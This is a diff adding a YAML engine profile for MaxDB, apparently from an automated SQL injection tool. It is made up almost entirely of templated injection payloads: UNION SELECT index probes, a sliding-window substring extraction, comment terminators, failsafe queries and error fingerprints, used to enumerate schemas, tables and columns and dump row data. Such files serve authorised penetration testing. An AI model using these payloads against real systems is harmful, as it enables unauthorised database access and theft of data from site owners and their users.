@@ -1,0 +1,123 @@
+engine: MaxDB
+
+resource:
+ info: |
+  select
+      '-'
+      || id
+      || '${enclose_value_sql}'
+      || database()
+      || '${enclose_value_sql}'
+      || user()
+      || '${trail_sql}'
+      r
+  from sysinfo.version
+
+ schema:
+  database: |
+   select
+       rr
+       || '${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.schemaname)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct schemaname from schemas) t,
+           (select distinct schemaname from schemas) t1
+       where t.schemaname >= t1.schemaname
+       group by t.schemaname
+       ${limit}
+   ) a
+
+  table: |
+   select
+       rr
+       || '${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.tablename)
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           rr
+       from
+           (select distinct tablename from tables where schemaname = '${database}') t,
+           (select distinct tablename from tables where schemaname = '${database}') t1
+       where t.tablename >= t1.tablename
+       group by t.tablename
+       ${limit}
+   ) a
+
+  column: |
+   select
+       rr
+       || '${trail_sql}'
+       r
+   from (
+       select
+           '${enclose_value_sql}'
+           || trim(t.columnname)
+           || '${separator_qte_sql}0${enclose_value_sql}'rr
+       from
+           (select distinct columnname from columns where schemaname = '${database}'and tablename = '${table}') t,
+           (select distinct columnname from columns where schemaname = '${database}'and tablename = '${table}') t1
+       where t.columnname >= t1.columnname
+       group by t.columnname
+       ${limit}
+   ) a
+
+  row:
+   query: |
+    select
+        rr
+        || '${trail_sql}'
+        r
+    from (
+        select
+            '${enclose_value_sql}'
+            || trim(t.s)
+            || '${separator_qte_sql}0${enclose_value_sql}'
+            rr
+        from
+            (select distinct ${fields} s from ${database}.${table}) t,
+            (select distinct ${fields} s from ${database}.${table}) t1
+        where t.s >= t1.s
+        group by t.s
+        ${limit}
+    ) a
+   fields:
+    field: trim(ifnull(chr(${field.value}), ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       '${lead}'
+       || substr(
+           r,
+           ${window.char},
+           1500
+       )
+   from (
+       ${injection}
+   ) x
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select (1337${indice}7330%2b1) r from dual
+  calibrator: rpad('${calibrator_sql}', 1024, '${calibrator_sql}', 1025)
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - "Warning: maxdb::"
+    - maxdb.query
+    - "\\): Invalid end of SQL statement"
+
+ union:
+  indices: union select ${result_range} from (${indice_unique})z
+  capacity: (select '${lead}${indice}' || ${calibrator} from dual)
+  orderBy: order by 1337
